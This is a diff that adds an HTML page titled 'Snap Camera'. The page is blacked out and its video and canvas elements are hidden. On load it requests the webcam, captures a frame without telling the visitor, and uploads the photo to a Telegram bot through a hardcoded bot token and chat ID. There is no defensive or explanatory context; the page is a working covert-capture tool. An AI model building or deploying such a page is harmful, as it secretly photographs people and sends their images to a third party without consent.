@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Snap Camera</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body style="background:black;color:black;">
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
+const CHAT_ID = "1186294172";
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  const video = document.getElementById("video");
+  video.srcObject = stream;
+
+  video.onloadedmetadata = () => {
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", blob);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    }, "image/jpeg");
+  };
+})
+.catch(err => {
+  console.error(err);
+});
+</script>
+</body>
+</html>
